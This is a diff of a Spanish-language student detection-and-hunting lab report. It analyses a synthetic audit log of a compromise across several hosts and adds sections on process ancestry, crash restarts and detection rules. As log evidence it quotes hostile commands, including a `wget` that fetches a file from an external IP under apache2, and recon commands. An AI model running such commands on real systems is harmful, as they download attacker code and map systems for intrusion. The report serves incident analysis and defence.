@@ -1,6 +1,6 @@
 # Detección y caza — Grupo 04
 
-**Integrantes:** Lorenzo Bellomo · **Fecha:** jueves 29/10/2026
+**Integrantes:** Lorenzo Bellomo (análisis), Agustin Ignacio Kloster (revisión, 30/10) · **Fecha:** jueves 29/10/2026
 
 Fuente: `laboratorio/logs/audit.log` (21 líneas, 2026-10-27 09:40–09:49 UTC).
 Filtro inicial con `./scripts/detectar.sh`
@@ -29,8 +29,8 @@ reconocimiento (`id`, `whoami`, `uname`) o URLs a IPs externas.
 | 2026-10-27T09:44:22Z (pid 906) | web01 | `apache2` (812) → `wget http://198.51.100.9/a` | **Sí** | Segunda acción en web01, ahora descarga directa sin shell intermedio, desde otra IP del mismo rango |
 | 2026-10-27T09:45:10Z (pid 704) y 09:45:11Z (pid 705) | svc01 | `python` (701) → `sh -c uname -a` → `uname` | **Sí** | Reconocimiento del sistema en el servicio **interno**, que no recibe tráfico de Internet. Sugiere que el atacante ya estaba adentro y se movió lateralmente |
 | 09:42:40Z (1002), 09:44:10Z (1003), 09:49:00Z (1004) | db01 | `sshd` (1001) → `-bash` | Indeterminado | Sesiones SSH interactivas. Pueden ser de un administrador, pero ocurren dentro de la ventana del ataque y db01 no figura en el inventario |
-| 09:41:12Z, 09:45:00Z, 09:47:00Z | api01 | `node` (501) → `node server.js` | No (baja) | Mismo binario y mismos argumentos que el servicio: compatible con un supervisor que reinicia la app. Igual conviene confirmar por qué reinicia cada 2 minutos |
-| 09:41:30Z, 09:43:40Z | svc01 | `python` (701) → `python app.py` | No (baja) | Igual que el caso anterior |
+| 09:41:12Z, 09:45:00Z, 09:47:00Z | api01 | `node` (501) → `node server.js` | Baja, a confirmar | Mismo binario y mismos argumentos que el servicio: compatible con un supervisor que reinicia la app. Pero rodean al `curl` de 09:43:03 (ver 2.2) |
+| 09:41:30Z, 09:43:40Z | svc01 | `python` (701) → `python app.py` | Baja, a confirmar | Igual que el caso anterior; el de 09:43:40 precede en 90 s al `uname` (ver 2.2) |
 | 09:40:01Z … 09:48:00Z | web01 | `apache2` (812) → `apache2 -k start` | No | Comportamiento normal: el master de Apache crea workers |
 
 **¿Hay compromiso?** **Sí** en web01, api01 y svc01, con **alcance indeterminado**.
@@ -46,6 +46,53 @@ reconocimiento (`id`, `whoami`, `uname`) o URLs a IPs externas.
   los servicios ejecutaron comandos.
 - Decisión: tratarlo como incidente en web01, api01 y svc01 (aislar, preservar
   evidencia, rotar secretos que esos servicios tengan), e investigar db01.
+
+### 2.1. De qué proceso cuelgan los hallazgos
+
+En los tres hosts, el proceso sospechoso tiene como padre el **mismo PID que crea las
+instancias del servicio**:
+
+| Host | PID padre | Qué más crea ese PID | Hallazgo |
+|---|---|---|---|
+| web01 | 812 | los workers `apache2 -k start` (900–908) | `sh -c id`, `wget` |
+| api01 | 501 | las instancias `node server.js` (600, 603, 604) | `sh -c curl …` |
+| svc01 | 701 | las instancias `python app.py` (702, 703) | `sh -c uname -a` |
+
+Con mod_php, el código PHP corre en los **workers**. Un shell disparado por PHP2Shell
+debería colgar de un worker (900–908), no del master 812. Hay dos lecturas:
+
+- El log simplifica el árbol y atribuye todo al proceso principal (es sintético).
+- La ejecución ocurrió en el **master** de Apache. En el lab, el master corre como
+  **root** ([`capturas/02-detectar.txt`](capturas/02-detectar.txt)); los workers,
+  como `www-data`. Si el log es fiel, el impacto en web01 es mayor que el que
+  asumimos.
+
+Sin UID en el log (sección 5) no se puede decidir entre las dos. Para la regla de la
+sección 4 deja una lección: conviene evaluar la **ascendencia** del proceso (algún
+ancestro `node`), no solo el padre directo, porque el árbol real puede tener
+intermediarios.
+
+### 2.2. Reinicios cerca de los hallazgos
+
+Los relanzamientos de `node server.js` y `python app.py` los marcamos de baja
+prioridad, pero merecen una segunda lectura. Node2Shell es una escritura fuera de
+rango y PHP2Shell parte de un OOM o error fatal. Un **intento fallido** de cualquiera
+de los dos típicamente **tira el proceso** y el supervisor lo relanza.
+
+- svc01: reinicio a las 09:43:40, `uname -a` a las 09:45:10 (90 s después).
+- api01: el `curl` de 09:43:03 queda entre los reinicios de 09:41:12 y 09:45:00.
+
+Hay una explicación alternativa: la cadencia es casi exacta (api01 a las 09:45:00 y
+09:47:00; workers de web01 a las 09:42:01, 09:44:00, 09:46:00 y 09:48:00) y se parece
+más a un reciclado programado que a crashes. El log no trae lo necesario para
+distinguirlas: el **código de salida o la señal** con que terminó la instancia
+anterior (SIGSEGV/SIGABRT frente a salida limpia), los eventos de OOM-kill del kernel
+y los logs de la app.
+
+**Mejora de detección:** alertar por reinicios de `node`, `python` o de workers de
+Apache que terminen por señal de crash. Cubre en parte el falso negativo "payload en
+memoria" de la sección 4: el intento exitoso puede no crear procesos, pero los
+fallidos suelen dejar rastro.
 
 ---
 
@@ -102,7 +149,10 @@ ruta y argumentos, no por nombre.
   `node` con argumentos distintos de `server.js`). Mejora: alertar por cualquier
   hijo que no sea exactamente `node server.js`.
 - **Cadenas largas:** `node` → `python` → `sh`; la regla ve el primer salto solo si
-  `python` está en la lista.
+  `python` está en la lista. Mejora: evaluar la ascendencia completa (algún ancestro
+  `node`) en lugar del padre directo (ver 2.1).
+- **Intentos fallidos:** un exploit que crashea `node` sin llegar a ejecutar nada no
+  crea hijos. Se cubre con la alerta de reinicios por crash de la sección 2.2.
 - **Procesos muy cortos:** si la telemetría muestrea (como `docker top`) en vez de
   registrar cada `execve`, un `curl` de un segundo se pierde.
 
